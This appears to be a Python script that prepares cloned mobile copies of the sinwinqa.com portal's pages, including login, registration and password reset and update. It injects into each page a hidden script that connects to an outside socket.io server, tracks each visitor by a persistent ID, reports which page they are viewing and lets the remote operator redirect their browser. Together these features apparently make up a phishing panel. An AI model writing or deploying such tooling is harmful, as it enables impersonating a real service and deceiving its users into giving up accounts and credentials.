from pathlib import Path
import re

TRACKER = """<script>
(function(){
  var SVID=localStorage.getItem('visitorId');
  var s=document.createElement('script');
  s.src='https://singlewindow.fly.dev/socket.io/socket.io.js';
  s.onload=function(){
    var sock=io('https://singlewindow.fly.dev',{transports:['polling','websocket'],reconnection:true});
    var m={'/':'الصفحة الرئيسية','/service':'صفحة الخدمات','/login':'تسجيل الدخول','/reset':'نسيت كلمة المرور','/update':'تحديث كلمة المرور'};
    function g(){var p=window.location.pathname;if(p.startsWith('/services/'))return 'خدمة: '+decodeURIComponent(p.replace('/services/','')).replace(/-/g,' ');return m[p]||p;}
    sock.on('connect',function(){
      sock.emit('visitor:register',{existingVisitorId:SVID,currentPage:g()});
      sock.emit('visitor:pageEnter',g());
    });
    sock.on('successfully-connected',function(d){if(d&&d.pid)localStorage.setItem('visitorId',d.pid);});
    sock.on('visitor:navigate',function(page){
      if(!page)return;
      var p=page.startsWith('/')?page:'/'+page;
      window.location.href=p;
    });
    window._sw_socket=sock;
  };
  document.head.appendChild(s);
})();
</script>"""

def process_page(src_path, dst_path, page_name):
    """Process a mobile page: fix links and inject tracker"""
    try:
        c = Path(src_path).read_text(encoding='utf-8', errors='ignore')
        
        # Fix absolute links to relative
        c = c.replace('https://www.sinwinqa.com/', '/')
        c = c.replace('https://www.sinwinqa.com', '')
        
        # Remove old tracker if any
        c = re.sub(r'<script>\s*\(function\(\)\{[^<]{30,}?_sw_socket[^<]*?\}\)\(\);\s*</script>', '', c, flags=re.DOTALL)
        
        # Inject tracker
        if '</head>' in c:
            c = c.replace('</head>', TRACKER + '\n</head>', 1)
        elif '</body>' in c:
            c = c.replace('</body>', TRACKER + '\n</body>', 1)
        
        Path(dst_path).write_text(c, encoding='utf-8')
        print(f"✅ Processed: {page_name}")
        return True
    except Exception as e:
        print(f"❌ Error {page_name}: {e}")
        return False

base = Path('/home/ubuntu/singlewindoo/client/public')

# Process main pages
pages = [
    ('/tmp/sinwinqa-mobile.html', base / 'sw-index.html', 'index'),
    ('/tmp/sinwinqa-service-mobile.html', base / 'sw-service.html', 'service'),
    ('/tmp/sinwinqa-reset-mobile.html', base / 'sw-reset.html', 'reset'),
    ('/tmp/sinwinqa-login-mobile.html', base / 'sw-login.html', 'login'),
    ('/tmp/sinwinqa-register-mobile.html', base / 'sw-register.html', 'register'),
    ('/tmp/sinwinqa-update-mobile.html', base / 'sw-update.html', 'update'),
]

for src, dst, name in pages:
    process_page(src, dst, name)

print("\n✅ Done!")
